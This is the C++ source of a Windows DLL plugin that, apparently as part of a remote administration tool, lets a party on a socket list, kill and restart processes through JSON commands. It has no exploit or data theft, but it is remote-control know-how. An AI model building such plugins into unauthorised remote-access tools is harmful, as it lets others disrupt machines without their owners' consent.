#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <cstdint>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;
using namespace std;

struct ProcessActionResult {
    bool success = false;
    string message = "";
};

static void send_json(SOCKET sock, const json& data) {
    string msg = data.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value) return "";

    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1) return "";

    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static string get_last_error_message(DWORD errorCode) {
    if (errorCode == ERROR_SUCCESS) return "Success";

    char* buffer = nullptr;
    DWORD size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&buffer,
        0,
        NULL
    );

    string message = (size && buffer) ? string(buffer, size) : ("Error code: " + to_string(errorCode));
    if (buffer) LocalFree(buffer);

    while (!message.empty() && (message.back() == '\r' || message.back() == '\n' || message.back() == ' '))
        message.pop_back();

    return message;
}

static json build_process_array() {
    json processes = json::array();

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return processes;
    }

    PROCESSENTRY32W entry;
    ZeroMemory(&entry, sizeof(entry));
    entry.dwSize = sizeof(entry);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            json item;
            item["name"] = wide_to_utf8(entry.szExeFile);
            item["pid"]  = static_cast<int>(entry.th32ProcessID);
            processes.push_back(item);
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return processes;
}

static void send_process_response(SOCKET sock, const ProcessActionResult* result = nullptr) {
    json response;
    response["action"] = "processresponse";
    response["processes"] = build_process_array();

    if (result) {
        response["result"] = {
            {"success", result->success},
            {"message", result->message}
        };
    }

    send_json(sock, response);
}

static bool query_process_path(HANDLE processHandle, string& path) {
    char buffer[MAX_PATH * 4];
    DWORD size = sizeof(buffer);

    if (QueryFullProcessImageNameA(processHandle, 0, buffer, &size)) {
        path.assign(buffer, size);
        return !path.empty();
    }

    return false;
}

static ProcessActionResult kill_process_by_pid(DWORD pid) {
    ProcessActionResult result;

    if (pid <= 4) {
        result.message = "System process cannot be terminated";
        return result;
    }

    HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!processHandle) {
        result.message = "OpenProcess failed: " + get_last_error_message(GetLastError());
        return result;
    }

    if (!TerminateProcess(processHandle, 0)) {
        result.message = "TerminateProcess failed: " + get_last_error_message(GetLastError());
        CloseHandle(processHandle);
        return result;
    }

    WaitForSingleObject(processHandle, 2000);
    CloseHandle(processHandle);

    result.success = true;
    result.message = "Process terminated";
    return result;
}

static ProcessActionResult restart_process_by_pid(DWORD pid) {
    ProcessActionResult result;

    if (pid <= 4) {
        result.message = "System process cannot be restarted";
        return result;
    }

    HANDLE processHandle = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!processHandle) {
        result.message = "OpenProcess failed: " + get_last_error_message(GetLastError());
        return result;
    }

    string processPath;
    if (!query_process_path(processHandle, processPath)) {
        result.message = "Process path could not be queried: " + get_last_error_message(GetLastError());
        CloseHandle(processHandle);
        return result;
    }

    if (!TerminateProcess(processHandle, 0)) {
        result.message = "TerminateProcess failed: " + get_last_error_message(GetLastError());
        CloseHandle(processHandle);
        return result;
    }

    WaitForSingleObject(processHandle, 2000);
    CloseHandle(processHandle);

    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;
    ZeroMemory(&startupInfo, sizeof(startupInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));
    startupInfo.cb = sizeof(startupInfo);

    string commandLine = "\"" + processPath + "\"";
    vector<char> commandBuffer(commandLine.begin(), commandLine.end());
    commandBuffer.push_back('\0');

    BOOL created = CreateProcessA(
        processPath.c_str(),
        commandBuffer.data(),
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &startupInfo,
        &processInfo
    );

    if (!created) {
        result.message = "CreateProcess failed: " + get_last_error_message(GetLastError());
        return result;
    }

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

    result.success = true;
    result.message = "Process restarted";
    return result;
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_process_response(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    ProcessActionResult result;

    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "getprocesses") {
            send_process_response(sock);
            return;
        }

        DWORD pid = static_cast<DWORD>(command.value("pid", 0));

        if (action == "killprocess") {
            result = kill_process_by_pid(pid);
            Sleep(300);
            send_process_response(sock, &result);
            return;
        }

        if (action == "restartprocess") {
            result = restart_process_by_pid(pid);
            Sleep(500);
            send_process_response(sock, &result);
            return;
        }

        result.message = "Unknown process manager action";
    } catch (const std::exception& e) {
        result.message = string("Command parse failed: ") + e.what();
    } catch (...) {
        result.message = "Command parse failed";
    }

    send_process_response(sock, &result);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
